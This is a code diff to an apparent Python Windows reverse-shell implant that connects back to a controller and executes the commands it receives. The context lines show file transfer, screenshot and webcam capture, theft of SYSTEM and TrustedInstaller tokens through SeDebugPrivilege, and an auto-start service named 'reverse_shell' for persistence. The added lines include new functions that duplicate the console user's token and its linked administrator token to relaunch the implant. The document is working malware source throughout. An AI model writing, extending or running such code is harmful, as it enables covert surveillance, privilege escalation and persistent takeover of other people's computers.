@@ -18,8 +18,10 @@ import pyautogui
 import win32api
 import win32con
 import win32process
+import win32profile
 import win32security
 import win32service
+import win32ts
 
 
 class Client(object):
@@ -72,55 +74,55 @@ class Client(object):
         client_util = ClientUtil()
         self.send(str(os.getcwd()) + '> ')
         cmd = self.recv()
-        exec = cmd.split(' ')[0]
+        executable = cmd.split(' ')[0]
         if cmd == 'null':
             pass
         elif cmd == 'kill':
             self.socket.close()
             sys.exit(0)
-        elif hasattr(client_util, exec):
-            func = getattr(client_util, exec)
+        elif hasattr(client_util, executable):
+            func = getattr(client_util, executable)
             args = inspect.getfullargspec(func).args
             argc = len(args)
             if not argc:
                 self.send(func())
-            elif 'client' in args:
+            elif 'client_obj' in args:
                 if argc == 1:
                     func(self)
                 else:
-                    func(self, cmd[len(exec) + 1:].strip())
+                    func(self, cmd[len(executable) + 1:].strip())
             else:
-                self.send(func(cmd[len(exec) + 1:].strip()))
+                self.send(func(cmd[len(executable) + 1:].strip()))
         else:
             self.send(client_util.execute(cmd))
 
 
 class ClientUtil:
     @staticmethod
-    def upload(client, filename):
-        client.recv_file(filename)
+    def upload(client_obj, filename):
+        client_obj.recv_file(filename)
 
     @staticmethod
-    def download(client, filename):
-        client.send_file(filename)
+    def download(client_obj, filename):
+        client_obj.send_file(filename)
 
     @staticmethod
-    def screenshot(client):
+    def screenshot(client_obj):
         filename = 'Screenshot.png'
         pyautogui.screenshot(filename)
-        client.send_file(filename)
+        client_obj.send_file(filename)
         if os.path.isfile(filename):
             os.remove(filename)
 
     @staticmethod
-    def webcam():
+    def webcam(client_obj):
         filename = 'Webcam.png'
         capture = cv2.VideoCapture(0)
         success, image = capture.read()
         if success:
             cv2.imwrite(filename, image)
             capture.release()
-        Client().send_file(filename)
+        client_obj.send_file(filename)
         if os.path.isfile(filename):
             os.remove(filename)
 
@@ -205,7 +207,7 @@ class ClientUtil:
     @staticmethod
     def stealtoken_system():
         try:
-            enable_privilege()
+            enable_privilege('SeDebugPrivilege')
             create_process(get_pid('winlogon.exe'))
             return '[+] Get system privileges success'
         except Exception as exception:
@@ -214,7 +216,7 @@ class ClientUtil:
     @staticmethod
     def stealtoken_ti():
         try:
-            enable_privilege()
+            enable_privilege('SeDebugPrivilege')
             start_service()
             create_process(get_pid('TrustedInstaller.exe'))
             return '[+] Get TrustedInstaller privileges success'
@@ -225,7 +227,7 @@ class ClientUtil:
     def stealtoken_admin():
         if not is_uac_enabled():
             return '[-] UAC is disabled'
-        enable_privilege()
+        enable_privilege('SeDebugPrivilege')
         for proc in psutil.process_iter():
             try:
                 process_name = proc.name()
@@ -270,7 +272,7 @@ class ClientUtil:
             if ctypes.windll.shell32.IsUserAnAdmin():
                 executable_path = os.path.realpath(sys.executable)
                 cmd = subprocess.Popen(
-                    'sc create reverse_shell binpath=" ' + executable_path + '" start= auto',
+                    'sc create reverse_shell binpath= "' + executable_path + '" start= auto',
                     shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 return '[+] Create service success\n' + str(cmd.stdout.read() + cmd.stderr.read(),
                                                             locale.getdefaultlocale()[1])
@@ -311,6 +313,22 @@ class ClientUtil:
         except Exception as exception:
             return '[-] Error: ' + str(exception)
 
+    @staticmethod
+    def run_as_user():
+        try:
+            create_process_in_user_session()
+            return '[+] Process created in user session'
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def run_as_admin():
+        try:
+            create_process_as_admin()
+            return '[+] Process created as administrator'
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
 
 class STARTUPINFO(ctypes.Structure):
     _fields_ = (('cb', wintypes.DWORD),
@@ -340,8 +358,8 @@ class PROCESS_INFORMATION(ctypes.Structure):
                 ('dwThreadId', wintypes.DWORD))
 
 
-def enable_privilege():
-    privilege_id = win32security.LookupPrivilegeValue(None, 'SeDebugPrivilege')
+def enable_privilege(privilege):
+    privilege_id = win32security.LookupPrivilegeValue(None, privilege)
     new_privilege = [(privilege_id, win32con.SE_PRIVILEGE_ENABLED)]
     token_handle = win32security.OpenProcessToken(win32process.GetCurrentProcess(), win32security.TOKEN_ALL_ACCESS)
     if token_handle:
@@ -370,13 +388,14 @@ def create_process(pid):
     si.cb = ctypes.sizeof(si)
     si.lpDesktop = 'winsta0\\default'
     creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
-    current_path = os.path.realpath(sys.executable)
+    executable_path = os.path.realpath(sys.executable)
     process_handle = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
     token_handle = win32security.OpenProcessToken(process_handle, win32con.TOKEN_DUPLICATE | win32con.TOKEN_QUERY)
     duplicate_token_handle = win32security.DuplicateTokenEx(token_handle, 3, win32con.MAXIMUM_ALLOWED,
                                                             win32security.TokenPrimary,
                                                             win32security.SECURITY_ATTRIBUTES())
-    ctypes.windll.advapi32.CreateProcessWithTokenW(int(duplicate_token_handle), 1, current_path, None, creation_flags,
+    ctypes.windll.advapi32.CreateProcessWithTokenW(int(duplicate_token_handle), 1, executable_path, None,
+                                                   creation_flags,
                                                    None, None, ctypes.byref(si), ctypes.byref(pi))
 
 
@@ -390,6 +409,35 @@ def get_elevation_type(pid):
 def is_uac_enabled():
     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
     return winreg.QueryValueEx(key, "EnableLUA")[0]
+
+
+def create_process_in_user_session():
+    executable_path = os.path.realpath(sys.executable)
+    enable_privilege('SeTcbPrivilege')
+    console_session_id = win32ts.WTSGetActiveConsoleSessionId()
+    console_user_token = win32ts.WTSQueryUserToken(console_session_id)
+    duplicate_token_handle = win32security.DuplicateTokenEx(console_user_token, 3, win32con.MAXIMUM_ALLOWED,
+                                                            win32security.TokenPrimary,
+                                                            win32security.SECURITY_ATTRIBUTES())
+    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
+    environment = win32profile.CreateEnvironmentBlock(duplicate_token_handle, False)
+    win32process.CreateProcessAsUser(duplicate_token_handle, executable_path, None, None, None, False,
+                                     creation_flags, environment, None, win32process.STARTUPINFO())
+
+
+def create_process_as_admin():
+    executable_path = os.path.realpath(sys.executable)
+    enable_privilege('SeTcbPrivilege')
+    console_session_id = win32ts.WTSGetActiveConsoleSessionId()
+    console_user_token = win32ts.WTSQueryUserToken(console_session_id)
+    duplicate_token_handle = win32security.DuplicateTokenEx(console_user_token, 3, win32con.MAXIMUM_ALLOWED,
+                                                            win32security.TokenPrimary,
+                                                            win32security.SECURITY_ATTRIBUTES())
+    admin_token = win32security.GetTokenInformation(duplicate_token_handle, ntsecuritycon.TokenLinkedToken)
+    creation_flags = win32con.CREATE_NEW_CONSOLE | win32con.NORMAL_PRIORITY_CLASS | win32con.CREATE_UNICODE_ENVIRONMENT
+    environment = win32profile.CreateEnvironmentBlock(admin_token, False)
+    win32process.CreateProcessAsUser(admin_token, executable_path, None, None, None, False,
+                                     creation_flags, environment, None, win32process.STARTUPINFO())
 
 
 while True:
